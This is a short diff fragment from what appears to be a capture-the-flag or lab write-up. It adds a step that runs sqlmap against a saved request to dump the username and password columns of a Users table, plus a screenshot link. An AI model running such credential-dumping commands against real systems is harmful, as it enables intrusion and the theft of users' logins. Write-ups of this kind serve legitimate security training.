@@ -111,3 +111,7 @@ Save in a txt file, sacnning with `sqlmap`
 
 We are right it vulnerable to SQL injection let dump it.
 
+`sqlmap -r scan.txt -D Webapp -T Users -C username,password --dump` dumping credentials seems cool.
+
+![image](https://user-images.githubusercontent.com/69868171/120682732-cc69df00-c46a-11eb-96a8-42a19f020606.png)
+
